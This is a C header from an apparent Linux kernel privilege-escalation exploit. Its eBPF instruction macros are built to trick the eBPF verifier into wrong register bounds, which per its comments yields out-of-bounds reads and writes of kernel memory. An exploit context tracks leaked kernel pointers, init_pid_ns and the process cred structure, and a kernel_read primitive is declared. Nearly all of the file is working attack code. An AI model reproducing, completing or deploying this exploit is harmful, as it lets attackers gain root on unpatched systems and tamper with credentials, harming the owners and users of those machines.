#ifndef _EXPLOIT_CONFIGS_H_
#define _EXPLOIT_CONFIGS_H_

#define ARRAY_MAP_SIZE 0x1337
#define DUMMY_MAP_ADD  0x1000

#define EXPLOIT_STATE_CLEAN 0
#define EXPLOIT_STATE_READ  1
#define EXPLOIT_STATE_WRITE 2

#define STORE_MAP_REG    BPF_REG_2
#define OOB_MAP_REG      BPF_REG_3
#define EXPLOIT_REG      BPF_REG_4
#define CONST_REG        BPF_REG_5
#define LEAK_VAL_REG     BPF_REG_6
#define UNKOWN_VALUE_REG BPF_REG_7
#define COPY_REG         BPF_REG_8


typedef struct exploit_context
{
    int oob_map_fd;
    int store_map_fd;
    int prog_fd;
    uint64_t oob_map_ptr;
    uint64_t array_map_ops;
    uint64_t init_pid_ns_kstrtab;
    uint64_t init_pid_ns;
    uint64_t cred;
    uint32_t state;
} exploit_context;


// The exploit primitive is an eBPF program contained into two parts. The first part only triggers the bug, where EXPLOIT_REG will have incorrect 32 bit bounds (u32_min_value=1,u32_max_value=0). 
// The second part causes the eBPF verifier to believe EXPLOIT_REG has a value of 0 but actually has a runtime value of 1. It is split into two parts because we only need the first part to leak
// the pointer to the BPF array map used for OOB read/writes. 
#define load_maps(oob_map_fd, store_map_fd) \
/* Mov 0 into r0 */ \
/* [stack-4] = 0 */ \
/* r2 = &[stack-4] (=0) */ \
/* LD_MAP_FD R1 of oob_map_fd */ \
/* BPF_FUNC_map_lookup_elem */ \
/* Returns pointer to the first map element */ \
/* load oob_map values ptr into reg_0 */ \
BPF_MOV64_IMM(BPF_REG_0, 0), \
BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), \
BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), \
BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), \
BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd), \
BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \
/* check if the returned map value pointer is valid */ \
BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), \
BPF_EXIT_INSN(), \
/* save oob map value ptr into preserved register reg_7 */ \
BPF_MOV64_REG(BPF_REG_7, BPF_REG_0), \
/* Do the same for STORE_MAP's element pointer */ \
/* load store_map values ptr into reg_0 */ \
BPF_MOV64_IMM(BPF_REG_0, 0), \
BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), \
BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), \
BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), \
BPF_LD_MAP_FD(BPF_REG_1, store_map_fd), \
BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \
/* check if the returned map value pointer is valid */ \
BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), \
BPF_EXIT_INSN(), \
/* store the map value pointer into designated register */ \
BPF_MOV64_REG(STORE_MAP_REG, BPF_REG_0),\
/* save the oob map value pointer in the designated register */ \
BPF_MOV64_REG(OOB_MAP_REG, BPF_REG_7),

#define generate_buggy_reg(oob_map_fd, store_map_fd) \
	load_maps(oob_map_fd, store_map_fd) \
	BPF_MOV64_IMM(BPF_REG_0, 0), \
	/* Load map value in BPF_REG_4 (fully uknown) */ \
	BPF_LDX_MEM(BPF_DW, BPF_REG_4, STORE_MAP_REG, 8),\
    /* ADd 4 to it (still fully unknown bc integer overflows) */ \
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_4, 0x4), \
	/* The upper 61bits of REG2 are 0s, the bottom3 are unknown */ \
	BPF_ALU64_IMM(BPF_AND, BPF_REG_4, 0x7),	\
	/* Go die if we're less than2 (we arent) */ \
	BPF_JMP_IMM(BPF_JGE, BPF_REG_4, 2, 1),	\
	BPF_EXIT_INSN(), \
	/* reg is in a weird state, */ \
	BPF_ALU64_IMM(BPF_ROL, BPF_REG_4, 62),  \
	\
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_4, 1), \
	/* Reg believed to be 0, it is 2 */ \
	BPF_ALU64_IMM(BPF_AND, BPF_REG_4, 0x2),  \
	\
 	/* Load map value in BPF_REG_7 (fully uknown (it is 0)) */ \
	BPF_LDX_MEM(BPF_DW, BPF_REG_7, STORE_MAP_REG, 8), \
	/* REG_7 now has MAX 1, MIN 0 */ \
	BPF_JMP_IMM(BPF_JLE, BPF_REG_7, 1, 1),			   \
	BPF_EXIT_INSN(), \
	\
	/* REG_4 now has MAX 1, MIN 0 (so *not* constant), but TRUE VAL 2 */ \
	BPF_ALU64_REG(BPF_ADD, BPF_REG_4, BPF_REG_7)

int kernel_read(exploit_context* pCtx, uint64_t addr, char* buffer, uint32_t len);

#endif